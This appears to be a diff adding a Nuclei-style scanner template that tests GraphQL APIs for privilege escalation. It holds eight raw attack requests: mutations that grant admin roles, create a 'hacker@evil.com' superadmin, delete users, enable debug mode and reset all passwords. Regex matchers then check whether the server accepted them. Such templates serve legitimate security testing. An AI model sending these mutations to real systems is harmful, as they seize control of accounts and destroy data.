@@ -1,0 +1,140 @@
+id: medium-api-graphql-mutation-privilege-escalation
+
+info:
+  name: GraphQL Mutation Privilege Escalation
+  author: redteam-elite
+  severity: medium
+  description: |
+    Detects GraphQL mutation privilege escalation vulnerabilities where attackers
+    can bypass authorization checks, escalate user privileges, or perform
+    unauthorized mutations through improper access control validation.
+  reference:
+    - https://graphql.org/learn/queries/#mutations
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L
+    cvss-score: 7.6
+    cwe-id: CWE-269
+  tags: graphql,mutation,privilege-escalation,authorization,api,medium
+
+http:
+  - raw:
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"mutation { updateUser(id: \"1\", input: { role: \"admin\", permissions: [\"read\", \"write\", \"delete\"] }) { id name role permissions } }"}
+
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"mutation { createUser(input: { username: \"hacker\", email: \"hacker@evil.com\", role: \"superadmin\", isActive: true }) { id username role } }"}
+
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"mutation { deleteUser(id: \"2\") { success message } }"}
+
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"mutation { updateSystemSettings(input: { maintenanceMode: false, debugMode: true, allowRegistration: true }) { success settings { debugMode } } }"}
+
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"mutation { grantPermission(userId: \"3\", permission: \"ADMIN_ACCESS\") { success user { id permissions } } }"}
+
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"mutation { promoteUser(userId: \"4\", newRole: \"SUPER_ADMIN\") { success user { id role isAdmin } } }"}
+
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"mutation { updateProfile(id: \"5\", input: { isVerified: true, accountType: \"premium\", credits: 9999 }) { id isVerified accountType credits } }"}
+
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"mutation { executeAdminCommand(command: \"RESET_ALL_PASSWORDS\") { success result } }"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: regex
+        part: body
+        regex:
+          - '"data":\s*\{'
+          - '"updateUser":\s*\{'
+          - '"createUser":\s*\{'
+          - '"deleteUser":\s*\{'
+          - '"updateSystemSettings":\s*\{'
+          - '"grantPermission":\s*\{'
+          - '"promoteUser":\s*\{'
+          - '"updateProfile":\s*\{'
+          - '"executeAdminCommand":\s*\{'
+        condition: or
+
+      - type: regex
+        part: body
+        regex:
+          - '"role":\s*"admin"'
+          - '"role":\s*"superadmin"'
+          - '"role":\s*"SUPER_ADMIN"'
+          - '"permissions":\s*\[[^\]]*"admin"[^\]]*\]'
+          - '"permissions":\s*\[[^\]]*"delete"[^\]]*\]'
+          - '"isAdmin":\s*true'
+          - '"success":\s*true'
+          - '"debugMode":\s*true'
+          - '"isVerified":\s*true'
+          - '"credits":\s*9999'
+        condition: or
+
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - '"errors":\s*\['
+          - '"error":\s*"unauthorized"'
+          - '"error":\s*"access.*denied"'
+          - '"error":\s*"insufficient.*privileges"'
+          - 'permission.*denied'
+          - 'authorization.*failed'
+
+      - type: word
+        part: header
+        negative: true
+        words:
+          - "X-GraphQL-Auth-Required: true"
+          - "X-Privilege-Check: failed"
+
+    stop-at-first-match: true
